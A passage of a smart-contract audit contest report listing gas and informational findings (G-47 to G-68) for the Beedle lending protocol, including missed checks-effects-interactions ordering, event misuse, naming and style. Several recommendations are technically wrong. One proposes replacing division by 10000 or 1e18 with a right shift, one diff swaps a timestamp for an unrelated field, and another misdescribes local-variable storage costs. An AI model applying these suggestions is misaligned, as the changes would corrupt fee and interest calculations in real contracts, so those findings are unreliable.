## Vulnerability Details

`<x> / 2` is the same as `<x> >> 1`. While the compiler uses the `SHR` opcode to accomplish both,
the version that uses division incurs an overhead of [**20 gas**](https://gist.github.com/0xxfu/84e3727f28e01f9b628836d5bf55d0cc)
due to `JUMP`s to and from a compiler utility function that introduces checks which can
be avoided by using `unchecked {}` around the division by two

**There are `6` instances of this issue:**

- [\_share = \_supplied \* \_delta / 1e18](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Staking.sol#L88) should use right shift `>>` operator to save gas.

- [fees = (debt \* borrowerFee) / 10000](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L265) should use right shift `>>` operator to save gas.

- [govFee = (borrowerFee \* loan.collateral) / 10000](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L561) should use right shift `>>` operator to save gas.

- [fee = (borrowerFee \* (debt - debtToPay)) / 10000](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L650) should use right shift `>>` operator to save gas.

- [interest = (l.interestRate _ l.debt _ timeElapsed) / 10000 / 31536000](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L724) should use right shift `>>` operator to save gas.

- [fees = (lenderFee \* interest) / 10000](https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol#L725) should use right shift `>>` operator to save gas.


## Impact

## Tools Used

## Recommendations
Using bit shifting (`>>` operator) replace division divided by constant.

## <a id='G-47'></a>G-47. CEI pattern not followed in multiple functions in Staking.sol

_Submitted by [kamuik16](https://profiles.cyfrin.io/u/undefined), [1d9f10834c](https://profiles.cyfrin.io/u/undefined), [stoicov](https://profiles.cyfrin.io/u/undefined), [PTolev](https://profiles.cyfrin.io/u/undefined), [0x11singh99](https://profiles.cyfrin.io/u/undefined). Selected submission by: [stoicov](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L38

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L38

## Summary
In Staking.deposit() and Staking.claim() CEI pattern is not followed. I am confident that reentrancies due to this are not possible in these functions however solidity best practices should be kept. I am submitting this as informational.

## Vulnerability Details
The deposit() function of Staking.sol first performs the transfer of deposit tokens to the staking contract and then does changes to the state. The claim() function first updates the index for msg.sender , then sends the claimable WETH to the msg.sender and after that sets the changes to the state. Here reentrancy is not possible since the token we are transfering is WETH (we know for sure it is not ERC777) and because of the fact that token transfers do not require a fallback function to be implemented by the receiver. However I believe adhering to solidity best practices is the way to go. This is Informational

## Impact
Not following solidity best practices

## Tools Used
Manual Review
## Recommendations
Apply the checks-effects-interactions pattern in the above mentioned functions.
## <a id='G-48'></a>G-48. [G-01] - Do not add the data which is alreday included in the tx to save users gas cost.

_Submitted by [Dharma](https://profiles.cyfrin.io/u/undefined), [xfu](https://profiles.cyfrin.io/u/undefined), [alymurtazamemon](https://profiles.cyfrin.io/u/undefined). Selected submission by: [alymurtazamemon](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L29

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L284

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L429

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L531

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L706

## Details

In the `Borrowed` event we added the `startTimestamp` and gave it the value `block.timestamp`. This increases the gas of users and because this data is already present in the transaction then we can save users gas costs by removing it from the event information.

`Each emits event will save 273 units of gas`

| Calculation Type | Before | After  | Gas Saved |
| :--------------- | :----- | :----- | --------: |
| Avg              | 364364 | 364091 |       273 |

```diff
    emit Borrowed(
        msg.sender,
        pool.lender,
        loans.length - 1,
        debt,
        collateral,
        pool.interestRate,
-       block.timestamp
+       pool.interestRate
    );
```
## <a id='G-49'></a>G-49. Cache array length outside of loop

_Submitted by [Dharma](https://profiles.cyfrin.io/u/undefined), [0x9527](https://profiles.cyfrin.io/u/undefined), [timenov](https://profiles.cyfrin.io/u/undefined), [samshz](https://profiles.cyfrin.io/u/undefined), [Avci](https://profiles.cyfrin.io/u/undefined), [neocrao](https://profiles.cyfrin.io/u/undefined), [SolSaver](https://profiles.cyfrin.io/u/undefined). Selected submission by: [timenov](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L233

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L293

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L359

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L438

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L549

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L592

## Summary
If not cached, the solidity compiler will always read the length of the array during each iteration. That is, if it is a storage array, this is an extra sload operation (100 additional extra gas for each iteration except for the first) and if it is a memory array, this is an extra mload operation (3 additional gas for each iteration except for the first).

## Recommendations
Cache the length of the array outside the for loop
## <a id='G-50'></a>G-50. Incorrect Event Emmiting

_Submitted by [leasowillow](https://profiles.cyfrin.io/u/undefined), [alymurtazamemon](https://profiles.cyfrin.io/u/undefined). Selected submission by: [leasowillow](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L165

## Summary

The incorrect event may be emitted.

## Vulnerability Details

The PoolBalanceUpdated event is emitted in both cases balance is updated and not.

## Impact

This may lead to the incorrect assumption of the contract state changes when tracking off-chain.

## Tools Used

Manual Review

## Recommendations

Emit the PoolBalanceUpdated event only when the balance is updated.
## <a id='G-51'></a>G-51. Unbounded loop in Lender.sol functions may revert. 

_Submitted by [EchoSpr](https://profiles.cyfrin.io/u/undefined), [owade](https://profiles.cyfrin.io/u/undefined), [rafaelnicolau](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [JrNet](https://profiles.cyfrin.io/u/undefined), [honeymewn](https://profiles.cyfrin.io/u/undefined). Selected submission by: [JrNet](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L562C55-L568

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L317-L332

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L267-L275


## Summary
Functions `seizeLoan()`, `borrow()`, `repay()` accepts unbounded length of arrays as parameters and all these contains transactions calls. If array contains large number of tokens, it will result in out-of-gas error and cause a revert.

```solidity
    function seizeLoan(uint256[] calldata loanIds) public {
        for (uint256 i = 0; i < loanIds.length; i++) {
            uint256 loanId = loanIds[i];
            
            ...

            // transfer the protocol fee to governance
            IERC20(loan.collateralToken).transfer(feeReceiver, govFee);
            // transfer the collateral tokens from the contract to the lender
            IERC20(loan.collateralToken).transfer(
                loan.lender,
                loan.collateral - govFee
            );

            ...

        }
    }
```

## Tools Used
manual code review

## Recommendations
It is recommended to restrict the array length
## <a id='G-52'></a>G-52. Misspelled event in `Lender.sol`

_Submitted by [0xanmol](https://profiles.cyfrin.io/u/undefined), [pacelli](https://profiles.cyfrin.io/u/undefined), [33audits](https://profiles.cyfrin.io/u/undefined), [0xDetermination](https://profiles.cyfrin.io/u/undefined). Selected submission by: [0xDetermination](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
`LoanSiezed` event in `Lender.sol` is spelled incorrectly
## Vulnerability Details
`LoanSiezed` is spelled incorrectly on lines 50 and 577 of `Lender.sol`. Note that the `loanSeized` function is spelled correctly.
## Impact

## Tools Used

## Recommendations
Change the two instances of `LoanSiezed` to `LoanSeized`.
## <a id='G-53'></a>G-53. Lender.sol: The error being `PoolConfig` in most cases is completely a downside of protocol as users can't know the reasons to why their transaction failed

_Submitted by [bauchibred](https://profiles.cyfrin.io/u/undefined), [owade](https://profiles.cyfrin.io/u/undefined). Selected submission by: [bauchibred](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L198-L201


## Summary

There are 7 instances of `PoolConfig` being used as the revert message in `Lender.sol` this seems like an unnecessary complexity that actually leads to users not understanding why exactly their transaction is not going through

## Vulnerability Details

See _Summary_. additionally take these instances as an example:
[Lender.sol#L146](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L146)

```solidity
        // you can't change the outstanding loans
        if (p.outstandingLoans != pools[poolId].outstandingLoans)
            revert PoolConfig();

```

[Lender.sol#L198-L201](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L198-L201)

```solidity
    function removeFromPool(bytes32 poolId, uint256 amount) external {
        if (pools[poolId].lender != msg.sender) revert Unauthorized();
        if (amount == 0) revert PoolConfig();

```

As seen the first revert happens in a case where the provided outstanding loans is not same as whst's been stored in the contract, whereas the second instance is a revert happening if the attempted removal is of `amount = 0`, but in both instances the reverted error message is poolConfig which just seems too vague and could easily lead to confusion.

## Impact

Users hardship while interacting with protocol as they would have a hard time trying to find out what's wrong with their attempted function executions

## Tools Used

Manual Audit

## Recommend Mitigation

Error messages should clearly indicate why a transaction has reverted, I recommend this mechanism to be implemented in the protocol

### Additional Note

There is an incomplete code explanation comment at [L442 of Lender.sol](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L442), it states that `validate the loan` whereas the validation being made in the next line is for the loan's lender, so `lender` should be added to the comment.

## <a id='G-54'></a>G-54. Setter functions not checking if value changed 

_Submitted by [bauchibred](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined). Selected submission by: [ZedBlockchain](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L84

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L100

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L92

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L210

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L221

## Summary
Setter functions can reset value to same value 

## Vulnerability Details
The following functions when setting state variables to a new variable do not check if the old variable is the same as the new variable. 
Lender.sol line 84
    function setLenderFee(uint256 _fee) external onlyOwner {
        if (_fee > 5000) revert FeeTooHigh();
        lenderFee = _fee;
    }
Lender.sol line 92
    function setBorrowerFee(uint256 _fee) external onlyOwner {
        if (_fee > 500) revert FeeTooHigh();
        borrowerFee = _fee;
    }
Lender.sol line 100
    function setFeeReceiver(address _feeReceiver) external onlyOwner {
        feeReceiver = _feeReceiver;
    }
Lender.sol line 210 
  function updateMaxLoanRatio(bytes32 poolId, uint256 maxLoanRatio) external {
        if (pools[poolId].lender != msg.sender) revert Unauthorized();
        if (maxLoanRatio == 0) revert PoolConfig();
        pools[poolId].maxLoanRatio = maxLoanRatio;
        emit PoolMaxLoanRatioUpdated(poolId, maxLoanRatio);
    } // no check that new maxLoanRatio is not same as old 

Lender.sol line 221
 function updateInterestRate(bytes32 poolId, uint256 interestRate) external {
        if (pools[poolId].lender != msg.sender) revert Unauthorized();
        if (interestRate > MAX_INTEREST_RATE) revert PoolConfig();
        pools[poolId].interestRate = interestRate;
        emit PoolInterestRateUpdated(poolId, interestRate);
    }



## Impact
Gas: By doing so there is gas waste of SSTORE 5000 gas for no impact on state of contracts. 

## Tools Used
Manual Analysis 

## Recommendations
It is recommended to only store new variable in state if it is different from the old value see examples below 
Lender.sol line 84
    function setLenderFee(uint256 _fee) external onlyOwner {
        if (_fee > 5000) revert FeeTooHigh();
        if(_fee != lenderFee) {
          lenderFee = _fee;
        }
    }
Lender.sol line 92
    function setBorrowerFee(uint256 _fee) external onlyOwner {
        if (_fee > 500) revert FeeTooHigh();
        if(_fee != borrowerFee) {
           borrowerFee = _fee;
        }   
    }
Lender.sol line 100
    function setFeeReceiver(address _feeReceiver) external onlyOwner {
        if(_feeReceiver != feeReceiver) {
            feeReceiver = _feeReceiver;
        }
    }
Ensure to check first that the new value to be set is different from the current value in storage 
Change for all other instances in the links in similar manner 

## <a id='G-55'></a>G-55. Function ordering does not follow the Solidity style guide

_Submitted by [tsar](https://profiles.cyfrin.io/u/undefined), [codeslide](https://profiles.cyfrin.io/u/undefined), [alymurtazamemon](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [neocrao](https://profiles.cyfrin.io/u/undefined), [SolSaver](https://profiles.cyfrin.io/u/undefined). Selected submission by: [SolSaver](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Beedle.sol

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/interfaces/IERC20.sol

## Summary
Function ordering does not follow the Solidity style guide

## Vulnerability Details
Functions should be grouped according to their visibility and ordered:

* constructor
* receive function (if exists)
* fallback function (if exists)
* external
* public
* internal
* private

Within a grouping, place the view and pure functions last.

Source: https://docs.soliditylang.org/en/v0.8.17/style-guide.html#order-of-functions

```solidity
File: src/Beedle.sol

36:     function mint(address to, uint256 amount) external onlyOwner {

```
Link to code - https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Beedle.sol

```solidity
File: src/Lender.sol

116:     function getLoanDebt(uint256 loanId) external view returns (uint256 debt) {

```
Link to code - https://github.com/Cyfrin/2023-07-beedle/tree/main/src/Lender.sol

```solidity
File: src/interfaces/IERC20.sol

9:     function transfer(address to, uint256 amount) external returns (bool);

```
Link to code - https://github.com/Cyfrin/2023-07-beedle/tree/main/src/interfaces/IERC20.sol


## Tools Used
Manual Code Review by SolSaver

## Recommendations
Follow the Solidity style guide

## <a id='G-56'></a>G-56. abi.encode(..) is less efficient 

_Submitted by [0x9527](https://profiles.cyfrin.io/u/undefined), [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [jboetticher](https://profiles.cyfrin.io/u/undefined), [ziva](https://profiles.cyfrin.io/u/undefined), [SAQ](https://profiles.cyfrin.io/u/undefined), [UrosZigic](https://profiles.cyfrin.io/u/undefined). Selected submission by: [ZedBlockchain](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L113

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L571

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L596

## Summary
abi.encode(..) is less efficient than abi.encodePacked(....)

## Vulnerability Details
poolId = keccak256(abi.encode(lender, loanToken, collateralToken)); // Lender.sol line 113
abi.encode(loan.lender, loan.loanToken, loan.collateralToken); // Lender.sol line 571 
abi.encode(loans[loanId].lender,.... // Lender.sol line 596

## Impact
Gas: abi.encode(...) pads parameters with 32 bytes whereas abi.encodePacked() does not pad the parameters using minimal space for type which is cheaper gas wise. The bigger the encoded bytes the more expensive. Cost of keccak is about 30 gas + 6 gas for each word (rounded up) for input data;  so it increases with input data size 

## Tools Used
Manual Analysis 

## Recommendations
It is recommended to replace all instances of abi.encode() with abi.encodePacked() as in example below 
poolId = keccak256(abi.encodePacked(lender, loanToken, collateralToken)); // Beedle.sol line 113
## <a id='G-57'></a>G-57. ensure loan exist before calculate the loandebt

_Submitted by [0x9527](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L116#L121

## Summary
ensure loan exist before calculate the loandebt
## Vulnerability Details
while calculate loan debt not check weather loan exist 
## Impact
gas
## Tools Used
manual
## Recommendations
check weather loan exists before calculating loan debt
## <a id='G-58'></a>G-58. Checks can be used without or operator for gas save

_Submitted by [inallhonesty](https://profiles.cyfrin.io/u/undefined), [TorpedopistolIxc41](https://profiles.cyfrin.io/u/undefined). Selected submission by: [TorpedopistolIxc41](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L130C3-L139C31

## Summary
If statements can be customized like down below to save gas 

## Recommendations

The order of the checks should be like this in case of revert it traverse from low gas used to high gas used checks and revert early

p.lender != msg.sender
16 gas

p.minLoanSize == 0
12 gas

p.maxLoanRatio == 0
12 gas

p.auctionLength == 0
20 gas

p.auctionLength > MAX_AUCTION_LENGTH
40 gas

p.interestRate > MAX_INTEREST_RATE
60 gas

LenderTest:test_createPool() (gas: 240654)

LenderTest:test_createPool() (gas: 240638)

changing validation into this layout to save gas 

        if (p.lender != msg.sender) revert PoolConfig();

        if (p.minLoanSize == 0 ) revert PoolConfig();

        if (p.maxLoanRatio == 0 ) revert PoolConfig();

        if (p.auctionLength == 0 ) revert PoolConfig();

        if (p.auctionLength > MAX_AUCTION_LENGTH) revert PoolConfig();

        if (p.interestRate > MAX_INTEREST_RATE) revert PoolConfig();




## Tools Used
Foundry test suit- snapshot

## <a id='G-59'></a>G-59. Typo in README "potisitions"

_Submitted by [nisedo](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/README.md?plain=1#L83

## Vulnerability Details
There is a typo in the README: "potisitions" instead of "positions"

## Impact
Unclean code

## Tools Used
Manual review

## Recommendations
Correct the spelling mistake "potisitions" into "positions"
## <a id='G-60'></a>G-60. `PoolBalanceUpdated` event is emitted even when pool balance is not changed.

_Submitted by [RugpullDetector](https://profiles.cyfrin.io/u/undefined), [Shogoki](https://profiles.cyfrin.io/u/undefined), [lian886](https://profiles.cyfrin.io/u/undefined). Selected submission by: [RugpullDetector](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L165

## Vulnerability Details
```solidity
function setPool(Pool calldata p) public returns (bytes32 poolId) {
        ...
        uint256 currentBalance = pools[poolId].poolBalance;

        if (p.poolBalance > currentBalance) {
            // if new balance > current balance then transfer the difference from the lender
            IERC20(p.loanToken).transferFrom(
                p.lender,
                address(this),
                p.poolBalance - currentBalance
            );
        } else if (p.poolBalance < currentBalance) {
            // if new balance < current balance then transfer the difference back to the lender
            IERC20(p.loanToken).transfer(
                p.lender,
                currentBalance - p.poolBalance
            );
        }

        emit PoolBalanceUpdated(poolId, p.poolBalance);
        ...
    }
```

## Tools Used
Manual Review

## Recommendations
It should only emit when balance is changed.

```solidity
function setPool(Pool calldata p) public returns (bytes32 poolId) {
        ...
        uint256 currentBalance = pools[poolId].poolBalance;

        if (p.poolBalance > currentBalance) {
            // if new balance > current balance then transfer the difference from the lender
            IERC20(p.loanToken).transferFrom(
                p.lender,
                address(this),
                p.poolBalance - currentBalance
            );
+           emit PoolBalanceUpdated(poolId, p.poolBalance);
        } else if (p.poolBalance < currentBalance) {
            // if new balance < current balance then transfer the difference back to the lender
            IERC20(p.loanToken).transfer(
                p.lender,
                currentBalance - p.poolBalance
            );
+           emit PoolBalanceUpdated(poolId, p.poolBalance);
        }

-       emit PoolBalanceUpdated(poolId, p.poolBalance);
        ...
    }
```
## <a id='G-61'></a>G-61. Initialize variables outside the loop

_Submitted by [jnrlouis](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L234-L236

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L294

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L360-L361

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L439

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L550

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L593-L594

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L602-L603

## Summary
For variables with values changing multiple times in a `for` loop, it is significantly cheaper to initialize these variables outside of the loop. This is because, an SSTORE (storage write) operation that goes from 0 to non-zero is 22k gas units, while non-zero to non-zero is only 5k units. Initializing these variables inside the loop would cost 22k gas on every iteration, while initializing the variables outside the loop would only cost 22k gas on the first iteration, and 5k gas on subsequent iterations.

## Vulnerability Details
See summary

## Impact
There are 12 instances of this.

## Tools Used
Foundry

## Recommendations
Consider initializing the variables outside the `for` loop. As an example, the `borrow` function could be rewritten like:
```solidity
    function borrow(Borrow[] calldata borrows) public {
        bytes32 poolId; // <-- Function initialized outside loop
        uint256 debt; // <-- Function initialized outside loop
        uint256 collateral; // <-- Function initialized outside loop
        for (uint256 i; i < borrows.length; ++i) {
            poolId = borrows[i].poolId;
            debt = borrows[i].debt;
            collateral = borrows[i].collateral;
            // get the pool info
            Pool memory pool = pools[poolId];
            // make sure the pool exists
            if (pool.lender == address(0)) revert PoolConfig();
            // validate the loan
            if (debt < pool.minLoanSize) revert LoanTooSmall();
            if (debt > pool.poolBalance) revert LoanTooLarge();
            if (collateral == 0) revert ZeroCollateral();
            ...
    }
```
## <a id='G-62'></a>G-62. Borrower can put up a loan which is immediately "insolvent" which can immediately be auctioned off.

_Submitted by [BanditSecurity](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L246-L247

## Vulnerability Details

Borrowing and lending protocols generally have a seperate liquidation price and maximum intiial loan price. This prevents users from taking a loan which can immediately be liquidated.

## Impact

Lack of this check allows borrowers to shoot themselves in the foot by taking a loan that can immediately be liquidated

## Tools Used

Manual Review

## Recommendations

Set a different loanRatio for entering a position compared to auctioning off a position
## <a id='G-63'></a>G-63. All interfaces must be in one folder

_Submitted by [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [Rolezn](https://profiles.cyfrin.io/u/undefined), [ch0bu](https://profiles.cyfrin.io/u/undefined). Selected submission by: [ZedBlockchain](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L7

https://github.com/Cyfrin/2023-07-beedle/tree/main/src/interfaces

## Summary
All interfaces must be in existing interfaces folder

## Vulnerability Details
There is an interfaces folder in the contracts. The expectation is that all interfaces for the contracts will be grouped in this folder for easier access and as best practises of having e.g interfaces, utilities, tokens etc in own seperate folders 
However in Staking.sol line 7 an interface FeeDistribution in in the contract

## Impact
Informational: This affects the code readability, best practises, quality and maintanability as interface is not expected in contract but in interfaces folder. 

## Tools Used
Manual Analysis 

## Recommendations
It is recommended that the interface defined in Staking.sol line 7 be moved to the interfaces folder 
## <a id='G-64'></a>G-64. Underscore function arguments 

_Submitted by [ZedBlockchain](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L80

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L84

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L100

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Beedle.sol

## Summary
Lack consistency function arguments structure e.g underscores _

## Vulnerability Details
Staking.sol all other functions use  _ e.g function withdraw(uint _amount) external for function arguments but line 80 does not 

Lender.sol all other functions from line 84 to line 100 use underscore but rest of function from line 108 where there is function getPoolId(
        address lender,
        address loanToken,
        address collateralToken
    ) do not make use of this format

Fees.sol all functions make use of underscore for function arguments 

Beedle.sol all functions do not make use of underscore 

The above shows inconsistencies within same contract and across the contracts 

## Impact
Informational: This leads to inconsistency in code affecting code quality, code readability and maintanability  

## Tools Used
Manual Analysis 

## Recommendations
It is recommended to be consistent and prefer _ to all function arguments across all relevant functions of all relevant contracts in project. If underscore not desired then ensure contracts follow same style and do not use them. If used for specific functions e.g all getter functions may be ideal to explain or detail this 
## <a id='G-65'></a>G-65. Solidity Optimizor

_Submitted by [ZedBlockchain](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle

## Summary
Solidity Gas Optimizor not set in configuration or documentation or policy 

## Vulnerability Details
The Solidity Optimizer settings are not explicitly set as a policy or in the configurations or foundry.toml etc
It appears there is no policy on this crucial issue or default e.g 200 runs is accepted

## Impact
This can result in using optimizer settings that are no best for reducing gas costs for the users. 
The more the runs e.g 10,000 the cheaper the gas costs for functions for users. The smaller the runs, the cheaper the deployment costs. It's essential to put users first in order to attract more and better usage of protocol. 

## Tools Used
Manual Analysis 

## Recommendations
It is recommended to test various solidity optimizer runs until the optimal value that reduces the gas costs of functions of users is obtained. Projects need to put users first and help reduce their costs of interacting with projects to increase their incentive to participate. 
E.g specify in foundry.toml file or as part of policy for deployment etc
optimizer = true
optimizer_runs = 2000
## <a id='G-66'></a>G-66. Custom Errors naming 

_Submitted by [ZedBlockchain](https://profiles.cyfrin.io/u/undefined), [alymurtazamemon](https://profiles.cyfrin.io/u/undefined). Selected submission by: [ZedBlockchain](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/utils/Errors.sol

## Summary
The errors in utils/Errors.sol not named according to best practise

## Vulnerability Details
Error naming is not indicative of the contract name in which the errors will be thrown. It is best practise for errors to have a prefix of the contract they are applied in. 

## Impact
Informational : Not naming errors with indication of contract can make error tracking, debuggin, analysis difficult as error data bubbles through chain of calls so it may not be clear if error contract receives is from where

## Tools Used
Manual analysis

## Recommendations
It is recommended the errors be named in accordance to the name of the contract in which they will be thrown e. g
error PoolConfig();  -> error Lender__PoolConfig();
error LoanTooSmall(); -> error Lender__LoanTooSmall();
error LoanTooLarge(); -> error Lender__LoanTooLarge();
error RatioTooHigh(); -> error Lender__RatioTooHigh(); 
error FeeTooHigh();   -> error Lender__FeeTooHigh();
error TokenMismatch(); -> error Lender__TokenMismatch();
error Unauthorized();  -> error Lender__Unauthorized();
error AuctionStarted(); -> error Lender__AuctionStarted();
error AuctionNotStarted(); -> error Lender__AuctionNotStarted();
error AuctionEnded(); -> error Lender__AuctionEnded();
error AuctionNotEnded(); -> error Lender__AuctionNotEnded();
error RateTooHigh();  -> error Lender__RateTooHigh();
error PoolTooSmall(); -> error Lender__PoolTooSmall();
error ZeroCollateral(); -> error Lender__ZeroCollateral(); 
error AuctionTooShort(); -> error Lender__AuctionTooShort();

## <a id='G-67'></a>G-67. Incorrect comments 

_Submitted by [ZedBlockchain](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L168

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L171

## Summary
Confusing comments 

## Vulnerability Details

Lender.sol lines 167-175 
if (pools[poolId].lender == address(0)) {
            // if the pool doesn't exist then create it
            emit PoolCreated(poolId, p);
        } else {
            // if the pool does exist then update it
            emit PoolUpdated(poolId, p);
        }

        pools[poolId] = p;

The pool is updated outside of the blocks--> pools[poolId] = p;
However the comments -> // if the pool doesn't exist then create it ---makes it seem as if in this if block a pool must be created when in actual fact its an event emitted 
However the comments -> // if the pool does exist then update it ----it makes it seem as if in this if block a pool must be created when in actual fact its an event emitted 

The comments make it seem as if some creation code or update code is missing in the if,else blocks 

## Impact
Informational: This affects code readability, interpretability, maintenance, auditability and can even introduce errors as dev working on project may think there needs to be some creation functions in the if, else blocks 

## Tools Used
Manual Analysis 

## Recommendations
It is recommended to remove the confusing comments or reword them to be appropriate 
## <a id='G-68'></a>G-68. The owner of the protocol can frontrun the `setLenderFee` if some borrower borrows a big amount of tokens

_Submitted by [Niki](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

